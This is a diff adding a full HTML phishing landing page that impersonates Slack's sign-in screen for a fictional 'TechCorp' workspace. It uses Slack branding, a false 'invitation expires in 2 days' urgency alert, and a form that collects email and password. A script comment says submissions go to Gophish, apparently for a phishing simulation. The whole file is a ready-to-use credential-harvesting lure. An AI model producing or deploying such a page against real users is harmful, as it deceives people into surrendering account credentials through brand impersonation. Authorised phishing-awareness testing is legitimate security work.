@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Slack - Sign in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Slack-Lato', 'Lato', appleLogo, sans-serif;
+            background-color: #f8f8f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 460px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .card {
+            background: #ffffff;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+            border-radius: 8px;
+            padding: 48px 40px;
+        }
+
+        h1 {
+            font-size: 40px;
+            font-weight: 700;
+            color: #1d1c1d;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 18px;
+            color: #616061;
+            margin-bottom: 32px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .subtitle strong {
+            color: #1d1c1d;
+        }
+
+        .alert {
+            background: linear-gradient(135deg, #fff4e6 0%, #ffe5cc 100%);
+            border-left: 4px solid #e8912d;
+            padding: 14px 16px;
+            margin-bottom: 24px;
+            border-radius: 6px;
+        }
+
+        .alert-text {
+            color: #cd5c00;
+            font-size: 13px;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+
+        .workspace-info {
+            background-color: #f8f8f8;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .workspace-name {
+            color: #1d1c1d;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .workspace-url {
+            color: #1264a3;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 700;
+            color: #1d1c1d;
+            margin-bottom: 8px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 18px;
+            border: 1px solid #8b8b8b;
+            border-radius: 4px;
+            background: #ffffff;
+            color: #1d1c1d;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        input::placeholder {
+            color: #8b8b8b;
+        }
+
+        input:hover {
+            border-color: #616061;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1264a3;
+            box-shadow: 0 0 0 4px rgba(18,100,163,0.1);
+        }
+
+        .button {
+            width: 100%;
+            padding: 14px;
+            font-size: 18px;
+            font-weight: 700;
+            background-color: #611f69;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 8px;
+        }
+
+        .button:hover {
+            background-color: #4a154b;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 16px;
+            color: #1264a3;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 32px 0;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background-color: #e0e0e0;
+        }
+
+        .divider span {
+            background-color: #ffffff;
+            padding: 0 16px;
+            position: relative;
+            font-size: 15px;
+            color: #616061;
+        }
+
+        .sso-button {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            background-color: #ffffff;
+            color: #1d1c1d;
+            border: 1px solid #8b8b8b;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s, border-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .sso-button:hover {
+            background-color: #f8f8f8;
+            border-color: #616061;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 32px;
+            font-size: 14px;
+            color: #616061;
+        }
+
+        .footer a {
+            color: #1264a3;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .new-to-slack {
+            background-color: #f8f8f8;
+            border-radius: 6px;
+            padding: 16px;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .new-to-slack-text {
+            color: #616061;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg width="140" height="36" viewBox="0 0 140 36">
+                <path d="M7.75 14.5h7.5c.69 0 1.25-.56 1.25-1.25v-7.5c0-.69-.56-1.25-1.25-1.25h-7.5c-.69 0-1.25.56-1.25 1.25v7.5c0 .69.56 1.25 1.25 1.25z" fill="#E01E5A"/>
+                <path d="M6.5 21c0-.69.56-1.25 1.25-1.25h7.5c.69 0 1.25.56 1.25 1.25v7.5c0 .69-.56 1.25-1.25 1.25h-7.5c-.69 0-1.25-.56-1.25-1.25v-7.5z" fill="#36C5F0"/>
+                <path d="M21 6.5c.69 0 1.25.56 1.25 1.25v7.5c0 .69-.56 1.25-1.25 1.25h-7.5c-.69 0-1.25-.56-1.25-1.25v-7.5c0-.69.56-1.25 1.25-1.25h7.5z" fill="#2EB67D"/>
+                <path d="M28.5 19.75h-7.5c-.69 0-1.25.56-1.25 1.25v7.5c0 .69.56 1.25 1.25 1.25h7.5c.69 0 1.25-.56 1.25-1.25v-7.5c0-.69-.56-1.25-1.25-1.25z" fill="#ECB22E"/>
+            </svg>
+        </div>
+
+        <div class="card">
+            <h1>Sign in to Slack</h1>
+            <p class="subtitle">
+                Enter your workspace's <strong>Slack URL</strong>
+            </p>
+
+            <div class="workspace-info">
+                <p class="workspace-name">TechCorp Workspace</p>
+                <p class="workspace-url">techcorp.slack.com</p>
+            </div>
+
+            <div class="alert">
+                <p class="alert-text">
+                    ⏰ <strong>Invitation Expiring:</strong> Your workspace invitation expires in 2 days. Sign in now to join your team.
+                </p>
+            </div>
+
+            <form id="loginForm" method="POST">
+                <div class="form-group">
+                    <label for="email">Email address</label>
+                    <input type="email" id="email" name="email" placeholder="name@example.com" required autofocus>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+
+                <button type="submit" class="button">Sign In with Email</button>
+
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </form>
+
+            <div class="divider">
+                <span>OR</span>
+            </div>
+
+            <button class="sso-button">
+                <svg width="20" height="20" viewBox="0 0 20 20">
+                    <path fill="#4285F4" d="M19.6 10.2c0-.6-.1-1.2-.2-1.8H10v3.4h5.4c-.2 1.1-.9 2.1-1.8 2.7v2.2h3c1.7-1.5 2.7-3.8 2.7-6.5z"/>
+                    <path fill="#34A853" d="M10 20c2.4 0 4.5-.8 6-2.2l-3-2.2c-.8.5-1.8.9-3 .9-2.3 0-4.3-1.5-5-3.6H2v2.3C3.4 17.8 6.5 20 10 20z"/>
+                    <path fill="#FBBC04" d="M5 12.9c-.2-.5-.3-1.1-.3-1.7s.1-1.2.3-1.7V7.2H2C1.4 8.4 1 9.7 1 11.2s.4 2.8 1 4l3-2.3z"/>
+                    <path fill="#EA4335" d="M10 4.6c1.3 0 2.5.5 3.4 1.3l2.5-2.5C14.5.9 12.4 0 10 0 6.5 0 3.4 2.2 2 5.2l3 2.3c.7-2.1 2.7-3.6 5-3.6z"/>
+                </svg>
+                Sign in with Google
+            </button>
+
+            <button class="sso-button">
+                <svg width="20" height="20" viewBox="0 0 20 20" fill="#000">
+                    <path d="M16.5 9.5c0-1.2.4-2.3 1.1-3.2-.9-1.3-2.3-2.1-3.9-2.2-1.7-.2-3.3.9-4.1.9-.9 0-2.2-.9-3.6-.9-1.9 0-3.6 1.1-4.5 2.7-2 3.4-.5 8.5 1.4 11.3 1 1.3 2.1 2.8 3.6 2.8 1.4-.1 2-.9 3.6-.9 1.7 0 2.1.9 3.6.9 1.5 0 2.6-1.4 3.6-2.7.7-.9 1.2-2 1.5-3.1-1.7-.7-2.8-2.4-2.8-4.3z"/>
+                </svg>
+                Sign in with Apple
+            </button>
+
+            <div class="new-to-slack">
+                <p class="new-to-slack-text">
+                    <strong>New to Slack?</strong> Slack is where work happens. It's a hub for teamwork that brings together everything you need.
+                </p>
+            </div>
+        </div>
+
+        <div class="footer">
+            New to Slack? <a href="#">Create a new workspace</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Let form submit naturally to Gophish
+        });
+    </script>
+</body>
+</html>
